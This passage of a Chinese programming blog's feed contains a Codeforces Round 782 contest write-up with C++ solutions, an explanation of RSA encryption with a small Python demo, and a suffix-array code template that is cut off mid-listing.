class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> x[<span class="number">1000005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,a,b;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld %lld %lld&quot;</span>,&amp;n,&amp;b,&amp;a);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    x[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> pos=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="comment">//attack</span></span><br><span class="line">        ans+=a*(x[i]-pos);</span><br><span class="line"><span class="comment">//        printf(&quot;attack %d %d %d\n&quot;,i,x[i],a);</span></span><br><span class="line"><span class="comment">//        printf(&quot;ans=%d\n&quot;,ans);</span></span><br><span class="line">        <span class="keyword">int</span> cost=(n-i)*a*(x[i]-pos);</span><br><span class="line">        <span class="keyword">if</span>(cost&gt;=b*(x[i]-pos))&#123;</span><br><span class="line">            ans+=b*(x[i]-pos);</span><br><span class="line">            pos=x[i];</span><br><span class="line"><span class="comment">//            printf(&quot;move in pos %d\n&quot;,i);</span></span><br><span class="line"><span class="comment">//            printf(&quot;ans=%d\n&quot;,ans);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Reverse-Sort-Sum"><a href="#D-Reverse-Sort-Sum" class="headerlink" title="D. Reverse Sort Sum"></a>D. Reverse Sort Sum</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/18/codeforces%20round%20782(div2)/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>给你描述了一个序列 A 的值为 $\sum _{i=1}^{n}f(i,A)$，$f(i,A)$ 函数得到的序列就是将序列 A 的前 i 个数排序，数的取值只有0,1。现在给定最终的结果，让你逆向分析初始可能的0,1序列。</p><p>这个我写了个假算法，我自己也无法证明这个算法的正确性，但是他就是过了。。</p><p>首先分析序列后半部分，容易得到，若$a_i&lt;i$，那么 $x_i=0$，否则$x_i=1$，因为后半部分至少有一半的值是来自自己贡献的。拿最后一个举例，如果最后一个值为1或0，那么原序列最后一个值必是0。否则是最后一个值一定是 n，没有其它情况，可以很容易得到的。</p><p>对于前半部分的序列的值确定了第$i$个0的位置，当然后半部分我们都确定好了，如果超出则直接结束循环输出结果。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> x[<span class="number">1000005</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1000005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x[i]);</span><br><span class="line">        a[i]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&gt;n/<span class="number">2</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(x[i]&lt;i)&#123;</span><br><span class="line">            a[i]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            a[i]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n/<span class="number">2</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!x[i])&#123;</span><br><span class="line">            a[i]=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a[i]==<span class="number">0</span>)x[i]+=i<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(x[i]==n)<span class="keyword">break</span>;</span><br><span class="line">        a[x[i]+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>D题可能有点问题，欢迎大家hack。</p><p>总之第一次Div2能做出四题，还是很开心的。</p><p>提交记录：</p><p><img src="/2022/04/18/codeforces%20round%20782(div2)/5.png" alt="5"></p><p><img src="/2022/04/18/codeforces%20round%20782(div2)/6.png" alt="6"></p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> 思维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RSA加密原理解析</title>
      <link href="/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/"/>
      <url>/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>今天来深度解析一下<code>RSA</code>加密</p><span id="more"></span><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>还是最朴素的例子，<code>Alice</code>和<code>Bob</code>要在不安全的路线上发送信息，整条线路完全被窃听者<code>Eve</code>所知，如何让<code>Alice</code>和<code>Bob</code>安全地通信呢？如果这个例子略难懂，那换一个来讲，我要给别人寄个快递，我怎样让别人不知道我寄的是什么，一般情况下，如果没什么特殊情况，快递是不会被随便拆开查看的，但是也很难说，如果我给我实际要送的东西上把锁，那么即使我送的快递被拆开，没有钥匙也不会有人知道我送的是啥，而钥匙只有收件人拥有。</p><p>这就是非对称加密的一个例子了，一个人只有锁，另一个人有钥匙，可以这么说，当把锁关上的那一刻，寄件人都没办法打开去检查他寄的是啥，如果这个锁足够强大的话。</p><h2 id="RSA加密"><a href="#RSA加密" class="headerlink" title="RSA加密"></a>RSA加密</h2><p>rsa主要是利用一系列的数学公式，让推导难以逆向分析，常见的有右移运算或者取模运算，RSA主要是使用取模运算。首先，我选择一个指数(e)，让明文(m)进行这么多次的幂运算，再模上一个数(N)，这也就得到了密文(c)，这个密文难以逆向得到明文，因为取模运算不可逆，这个e和N是公开的，所有人都可以加密，也就是锁，但是钥匙只有自己拥有。</p><p><img src="/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/1.png" alt="1"></p><p>这里也先给出加密和解密的公式：</p><p><img src="/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/2.png" alt="2"></p><p>在这里d由一个公式算得：d相当于e在模φ(n)意义下的逆元。也就是它们满足这个公式：</p><p>$e\times d \ \ \text{mod}\ \ φ(n)=1$</p><h2 id="RSA加密原理解析"><a href="#RSA加密原理解析" class="headerlink" title="RSA加密原理解析"></a>RSA加密原理解析</h2><p>为什么满足了这个关系就能通过上面的公式解密了呢？</p><p>通过e和d满足的关系我们可以得到这样的式子：</p><p>$e \times d=1+k*φ(n)$</p><p>k为任意整数。</p><p>$d=\frac{1+k*φ(n)}{e}$</p><p>这里还需要一个定理：欧拉定理</p><h3 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h3><p>这个算费马小定理的扩展吧，费马小定理的表达式如下：</p><p>对于任意整数a和任意质数p有以下式子成立：</p><p>$a^p$与$a$在$\ \text{mod}\ p$ 意义下同余，即$a^{p-1}\ \text{mod}\ p=1$</p><p>而对于任意质数，它的欧拉函数就是自己-1，欧拉函数的描述为</p><blockquote><p>欧拉函数 是小于或等于n的正整数中与n互质的数的数目</p></blockquote><p>而对于非质数，它一定可以写成若干个质数相乘，即</p><p>$n=p_1^{a_1}\times p_2^{a_2}\times p_3^{a_3}\times……\times p_n^{a_n}$</p><p>$a_i$为任意整数，$p_i$为任意质数，就是说，任何一个大于2的整数一定会有上式成立。</p><p>它的欧拉函数则是</p><p>$φ(n)=(p_1-1)p_1^{a_1-1}\times(p_2-1)p_2^{a_2-1}\times(p_3-1)p_3^{a_3-1}\times……\times(p_n-1)p_n^{a_n-1}$</p><p>那么欧拉定理的表达式是什么呢，那就是下面这个式子：</p><p>任意正整数a和p，有以下式子成立</p><p>$a^{φ(p)}\ \text{mod}\ p=1$</p><p>有了这个式子之后我们再代入上面那个式子，可以得到</p><p>$m^{e\times d}\ \text{mod}\  n=m^{1+kφ(n)}\ \text{mod}\ n$</p><p>这里需要用到一些简单的同余定理：</p><p>$a\times b\ \text{mod}\ n=((a\ \text{mod}\ n)\times (b\ \text{mod}\ n))\ \text{mod}\ n$</p><p>那么$m^{1+kφ(n)}\ \text{mod}\ n=m*(m^{φ(n)}\ \text{mod}\ n)^k\ \text{mod}\ n$</p><p>而括号里的表达式恒为1，最后结果就变成了$m$</p><p>可以发现，如果m不大于n，那么m的值应当是唯一的，而加密出现的中间产物$c$若没有$d$则永远无法推到得到$m$，这也就是<code>RSA</code>算法的核心了。</p><h2 id="RSA密钥生成"><a href="#RSA密钥生成" class="headerlink" title="RSA密钥生成"></a>RSA密钥生成</h2><p>讲完了原理之后我们来讲讲怎么生成RSA密钥，首先选取两个很大的质数p,q，这里得到n=p*q，那么容易得到n的欧拉函数$φ(n)=(p-1)\times (q-1)$</p><p>再任意选取一个质数e作为加密质数，也很容易算出解密指数$d=\text{inverse}(e,φ(n))$ ，inverse为求模逆元的函数。</p><p>$(e,n)$就是公钥，$(d,n)$就是私钥，这样我们的密钥就生成完毕了。</p><h2 id="python代码实现"><a href="#python代码实现" class="headerlink" title="python代码实现"></a>python代码实现</h2><p>这里用到一个<code>Crypto</code>库，安装方法为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pycryptodome</span><br></pre></td></tr></table></figure><p>demo:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse(e,phi)</span><br><span class="line">m=<span class="number">123456</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">dec=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(dec)</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/3.png" alt="3"></p><p>你也可以多取几个其它的数试试看，看看能不能得到一样的结果，因为质数随机生成，print(c)这一步不能保证一模一样，但是dec的值一定是和你输入的m一样的。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SA板子</title>
      <link href="/2022/04/02/SA%E6%9D%BF%E5%AD%90/"/>
      <url>/2022/04/02/SA%E6%9D%BF%E5%AD%90/</url>
      
        <content type="html"><![CDATA[<p>本篇博客只有板子。</p><span id="more"></span><p>sa[i]：排名为i的后缀的下标</p><p>rak[i]：后缀suff[i]的排名</p><p>Height[i]：后缀按照字典排序之后，该后缀与上一个后缀的最长公共前缀，也就是排名为i的后缀字符串和排名为i-1的后缀字符串的最长公共前缀。</p><h2 id="DA算法-O-nlogn"><a href="#DA算法-O-nlogn" class="headerlink" title="DA算法(O(nlogn))"></a>DA算法(O(nlogn))</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">100010</span>;</span><br><span class="line"><span class="keyword">int</span> wa[N],wb[N],wv[N],wss[N],rak[N],height[N],cal[N],n,sa[N];</span><br><span class="line"><span class="keyword">char</span> s[N];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> *r,<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> l)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="keyword">return</span> r[a]==r[b]&amp;&amp;r[a+l]==r[b+l];&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">da</span><span class="params">(<span class="keyword">int</span> *r,<span class="keyword">int</span> *sa,<span class="keyword">int</span> n,<span class="keyword">int</span> M)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> i,j,p,*x=wa,*y=wb,*t;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;M;i++) wss[i]=<span class="number">0</span>;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) wss[x[i]=r[i]]++;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;M;i++) wss[i]+=wss[i<span class="number">-1</span>];</span><br><span class="line">     <span class="keyword">for</span>(i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--) sa[--wss[x[i]]]=i;</span><br><span class="line">     <span class="keyword">for</span>(j=<span class="number">1</span>,p=<span class="number">1</span>;p&lt;n;j*=<span class="number">2</span>,M=p) &#123;</span><br><span class="line">        <span class="keyword">for</span>(p=<span class="number">0</span>,i=n-j;i&lt;n;i++) y[p++]=i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) <span class="keyword">if</span>(sa[i]&gt;=j) y[p++]=sa[i]-j;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) wv[i]=x[y[i]];</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;M;i++) wss[i]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) wss[wv[i]]++;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;M;i++) wss[i]+=wss[i<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span>(i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--) sa[--wss[wv[i]]]=y[i];</span><br><span class="line">        <span class="keyword">for</span>(t=x,x=y,y=t,p=<span class="number">1</span>,x[sa[<span class="number">0</span>]]=<span class="number">0</span>,i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">        x[sa[i]]=<span class="built_in">cmp</span>(y,sa[i<span class="number">-1</span>],sa[i],j)?p<span class="number">-1</span>:p++;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calheight</span><span class="params">(<span class="keyword">int</span> *r,<span class="keyword">int</span> *sa,<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> i,j,k=<span class="number">0</span>;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++) rak[sa[i]]=i;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;height[rak[i++]]=k)</span><br><span class="line">     <span class="keyword">for</span>(k?k--:<span class="number">0</span>,j=sa[rak[i]<span class="number">-1</span>];r[i+k]==r[j+k];k++);</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i;i--)rak[i]=rak[i<span class="number">-1</span>],sa[i]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cas=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    cin&gt;&gt;k;</span><br><span class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s+<span class="number">1</span>))&#123;</span><br><span class="line">        n=<span class="built_in">strlen</span>(s+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">            cal[i]=s[i];</span><br><span class="line">        cal[n+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">da</span>(cal+<span class="number">1</span>,sa,n+<span class="number">1</span>,<span class="number">200</span>);</span><br><span class="line">        <span class="built_in">calheight</span>(cal+<span class="number">1</span>,sa,n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,height[i]);</span><br><span class="line">        &#125;<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,sa[i]);</span><br><span class="line">        &#125;<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,rak[i]);</span><br><span class="line">        &#125;<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            ans+=rak[i]-height[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>,ans);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="DC3算法-O-n"><a href="#DC3算法-O-n" class="headerlink" title="DC3算法(O(n))"></a>DC3算法(O(n))</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> F(x) ((x) / 3 + ((x) % 3 == 1 ? 0 : tb))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> G(x) ((x) &lt; tb ? (x) * 3 + 1 : ((x) - tb) * 3 + 2)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">3</span>*(<span class="number">1e5</span>+<span class="number">5</span>);</span><br><span class="line"><span class="keyword">int</span> wa[N], wb[N], ws[N], wv[N], sa[N];</span><br><span class="line"><span class="keyword">int</span> rak[N], height[N], cal[N],n;</span><br><span class="line"><span class="keyword">char</span> s[N],ans[N],s1[N];</span><br><span class="line"><span class="keyword">int</span> cnt[N];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">c0</span><span class="params">(<span class="keyword">int</span> *r, <span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> r[a] == r[b] &amp;&amp; r[a + <span class="number">1</span>] == r[b + <span class="number">1</span>] &amp;&amp; r[a + <span class="number">2</span>] == r[b + <span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">c12</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> *r, <span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (k == <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> r[a] &lt; r[b] || r[a] == r[b] &amp;&amp; <span class="built_in">c12</span>(<span class="number">1</span>, r, a + <span class="number">1</span>, b + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> r[a] &lt; r[b] || r[a] == r[b] &amp;&amp; wv[a + <span class="number">1</span>] &lt; wv[b + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Rsort</span><span class="params">(<span class="keyword">int</span> *r, <span class="keyword">int</span> *a, <span class="keyword">int</span> *b, <span class="keyword">int</span> n, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) wv[i] = r[a[i]];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) ws[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) ws[wv[i]]++;</span><br><span 